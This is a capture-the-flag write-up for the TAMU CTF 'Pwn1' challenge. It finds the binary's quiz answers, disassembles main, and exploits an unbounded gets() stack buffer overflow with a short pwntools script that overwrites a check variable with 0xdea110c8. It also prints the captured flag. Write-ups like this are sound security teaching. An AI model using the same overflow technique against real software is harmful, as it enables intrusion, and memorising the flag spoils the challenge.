# Pwn1
Pwn, 227 points

## Description:

A binary file was attached, in addition to an address and port.

## Solution:

Let's run the binary:

```console
root@kali:/media/sf_CTFs/tamu/Pwn1# ./pwn1
Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is your name?
test
I don't know that! Auuuuuuuugh!
```

So we need to answer the question in order to proceed.

The first place to search for an answer is `strings`:

```console
root@kali:/media/sf_CTFs/tamu/Pwn1# strings pwn1
[...]
Right. Off you go.
flag.txt
Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is your name?
Sir Lancelot of Camelot
I don't know that! Auuuuuuuugh!
What... is your quest?
To seek the Holy Grail.
What... is my secret?
[...]
```

`Sir Lancelot of Camelot` seems like a reasonable response.

```console
root@kali:/media/sf_CTFs/tamu/Pwn1# echo "Sir Lancelot of Camelot" | ./pwn1
Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is your name?
What... is your quest?
I don't know that! Auuuuuuuugh!
```

So we moved past the first question, new we are requested to provide a quest. `To seek the Holy Grail.` makes most sense, given the strings in the binary:

```console
root@kali:/media/sf_CTFs/tamu/Pwn1# { echo "Sir Lancelot of Camelot"; echo "To seek the Holy Grail."; } | ./pwn1
Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is your name?
What... is your quest?
What... is my secret?
I don't know that! Auuuuuuuugh!
```

So far, so good. But what is the secret? Looks like we'll have to open the binary with a disassembler after all:

```
root@kali:/media/sf_CTFs/tamu/Pwn1# r2 pwn1
 -- R2 loves everyone, even Java coders, but less than others
[0x000005c0]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[x] Type matching analysis for all functions (afta)
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x000005c0]> afl
0x00000000   48 1236 -> 1242 sym.imp.__cxa_finalize
0x000004d4    3 35           sym._init
0x00000510    1 6            sym.imp.strcmp
0x00000520    1 6            sym.imp.gets
0x00000530    1 6            sym.imp.fgets
0x00000540    1 6            sym.imp._IO_getc
0x00000550    1 6            sym.imp.puts
0x00000560    1 6            sym.imp.exit
0x00000570    1 6            sym.imp.__libc_start_main
0x00000580    1 6            sym.imp.setvbuf
0x00000590    1 6            sym.imp.fopen
0x000005a0    1 6            sym.imp.putchar
0x000005b0    1 6            fcn.000005b0
0x000005b8    1 6            fcn.000005b8
0x000005c0    1 49           entry0
0x000005f2    1 4            fcn.000005f2
0x00000600    1 4            sym.__x86.get_pc_thunk.bx
0x00000610    4 58   -> 53   sym.deregister_tm_clones
0x00000650    4 71           sym.register_tm_clones
0x000006a0    5 71           sym.__do_global_dtors_aux
0x000006f0    1 9            entry1.init
0x000006f9    1 4            sym.__x86.get_pc_thunk.dx
0x000006fd    4 124          sym.print_flag
0x00000779    8 362          sym.main
0x000008f0    4 93           sym.__libc_csu_init
0x00000950    1 2            sym.__libc_csu_fini
0x00000954    1 20           sym._fini
[0x000005c0]> s sym.main
```

Here's an overview of the main function:

```
 .----------------------------------------------------------------------------------------------------------------------------.
 | [0x779]                                                                                                                    |
 | ;-- main:                                                                                                                  |
 | 0x0000078b call sym.__x86.get_pc_thunk.bx                                                                                  |
 | 0x0000079e size_t size                                                                                                     |
 | 0x000007a0 int mode                                                                                                        |
 | 0x000007a2 char *buf                                                                                                       |
 | 0x000007a4 FILE*stream                                                                                                     |
 | 0x000007a5 call sym.imp.setvbuf                                                                                            |
 | 0x000007be str.Stop__Who_would_cross_the_Bridge_of_Death_must_answer_me_these_questions_three__ere_the_other_side_he_see.  |
 | 0x000007c4 const char *s                                                                                                   |
 | 0x000007c5 call sym.imp.puts                                                                                               |
 | 0x000007d0 str.What..._is_your_name                                                                                        |
 | 0x000007d6 const char *s                                                                                                   |
 | 0x000007d7 call sym.imp.puts                                                                                               |
 | 0x000007ea FILE *stream                                                                                                    |
 | 0x000007eb int size                                                                                                        |
 | 0x000007f0 char *s                                                                                                         |
 | 0x000007f1 call sym.imp.fgets                                                                                              |
 | 0x000007fc str.Sir_Lancelot_of_Camelot                                                                                     |
 | 0x00000802 const char *s2                                                                                                  |
 | 0x00000806 const char *s1                                                                                                  |
 | 0x00000807 call sym.imp.strcmp                                                                                             |
 `----------------------------------------------------------------------------------------------------------------------------'
         f t
         | |
         | '----------------------------------------------------------.
         '------------------------.                                   |
                                  |                                   |
                              .-------------------------------.   .---------------------------------.
                              |  0x813 [gi]                   |   |  0x82f [gf]                     |
                              | 0x0000081c const char *s      |   | 0x00000838 const char *s        |
                              | 0x0000081d call sym.imp.puts  |   | 0x00000839 call sym.imp.puts    |
                              | 0x00000828 int status         |   | 0x0000084c FILE *stream         |
                              | 0x0000082a call sym.imp.exit  |   | 0x0000084d int size             |
                              `-------------------------------'   | 0x00000852 char *s              |
                                                                  | 0x00000853 call sym.imp.fgets   |
                                                                  | 0x00000864 const char *s2       |
                                                                  | 0x00000868 const char *s1       |
                                                                  | 0x00000869 call sym.imp.strcmp  |
                                                                  `---------------------------------'
                                                                          f t
                                                                          | |
                                                                          | '------------.
                                                     .--------------------'              |
                                                     |                                   |
                                                 .-------------------------------.   .-------------------------------.
                                                 |  0x875 [gk]                   |   |  0x891 [gj]                   |
                                                 | 0x0000087e const char *s      |   | 0x0000089a const char *s      |
                                                 | 0x0000087f call sym.imp.puts  |   | 0x0000089b call sym.imp.puts  |
                                                 | 0x0000088a int status         |   | 0x000008a9 char *s            |
                                                 | 0x0000088c call sym.imp.exit  |   | 0x000008aa call sym.imp.gets  |
                                                 `-------------------------------'   `-------------------------------'
                                                                                             f t
                                                                                             | |
                                                                                             | '------------.
                                                                      .----------------------'              |
                                                                      |                                     |
                                                                  .--------------------------------.    .-------------------------------.
                                                                  |  0x8bb [gp]                    |    |  0x8c2 [gm]                   |
                                                                  | 0x000008bb call sym.print_flag |    | 0x000008cb const char *s      |
                                                                  `--------------------------------'    | 0x000008cc call sym.imp.puts  |
                                                                      v                                 `-------------------------------'
                                                                      |                                     v
                                                                      |                                     |
                                                                      '-------------------------.           |
                                                                                                | .---------'
                                                                                                | |
                                                                                          .--------------------.
                                                                                          |  0x8d4 [go]        |
                                                                                          `--------------------'


```


We can see that we want to take the "true" branch from `[gf]` to `[gj]` and then the false branch to `[gp]`.

It looks like `[gj]` contains the interesting part, let's zoom in:

```
 .------------------------------------------.
 |  0x891 [gj]                              |
 | ; CODE XREF from sym.main (0x873)        |
 | sub esp, 0xc                             |
 | lea eax, [ebx - 0x1534]                  |
 | ; const char *s                          |
 | push eax                                 |
 | ; int puts(const char *s)                |
 | call sym.imp.puts;[gc]                   |
 | add esp, 0x10                            |
 | sub esp, 0xc                             |
 | lea eax, [s1]                            |
 | ; char *s                                |
 | push eax                                 |
 | ; char *gets(char *s)                    |
 | call sym.imp.gets;[gl]                   |
 | add esp, 0x10                            |
 | cmp dword [local_10h], 0xdea110c8        |
 | jne 0x8c2;[gm]                           |
 `------------------------------------------'
```

We read a value from the user into `s1` using an unbounded `gets`, and then compare `local_10h` to `0xdea110c8`. 

Let's take a look at the function stack:
```
 ; var char *s1 @ ebp-0x3b
 ; var unsigned int local_10h @ ebp-0x10
 ; var int local_ch @ ebp-0xc
 ; var int local_8h @ ebp-0x8
 ; arg int arg_4h @ esp+0x4
```

So `s1` is right above `local_10h`, and can overflow it. The length of `s1` is `0x3b-0x10`, we just need to fill that with a filler and then write the value we want: `0xdea110c8`.

The following script exploits this buffer overflow:

```python
from pwn import *

MAGIC_VALUE = 0xDEA110C8

if args.REMOTE:
    p = remote("pwn.tamuctf.com", 4321)
else:
    p = process("./pwn1")


p.sendlineafter("What... is your name?", "Sir Lancelot of Camelot")
p.sendlineafter("What... is your quest?", "To seek the Holy Grail.")
offset = 0x3b - 0x10
payload = fit({offset: p32(MAGIC_VALUE)}, filler = 'A')
p.sendlineafter("What... is my secret?", payload)
print p.recvall()
```

Output:

```console
root@kali:/media/sf_CTFs/tamu/Pwn1# python exploit.py REMOTE
[+] Opening connection to pwn.tamuctf.com on port 4321: Done
[+] Receiving all data: Done (50B)
[*] Closed connection to pwn.tamuctf.com port 4321

Right. Off you go.
gigem{34sy_CC428ECD75A0D392}
```